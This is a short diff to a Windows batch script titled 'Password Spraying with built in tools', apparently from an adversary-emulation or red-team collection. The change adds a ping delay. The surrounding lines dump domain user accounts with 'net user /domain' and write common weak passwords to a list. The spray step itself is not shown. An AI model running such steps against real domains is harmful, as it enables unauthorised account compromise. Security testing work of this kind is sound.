@@ -3,6 +3,9 @@
 ECHO ===========================================================================
 ECHO PASSWORD SPRAY
 ECHO Password Spraying with built in tools
+ping -n 5 127.0.0.1 > NUL
+
+
 net user /domain > DomainUsers.txt
 echo \"Password1\" >> pass.txt
 echo \"1q2w3e4r\" >> pass.txt
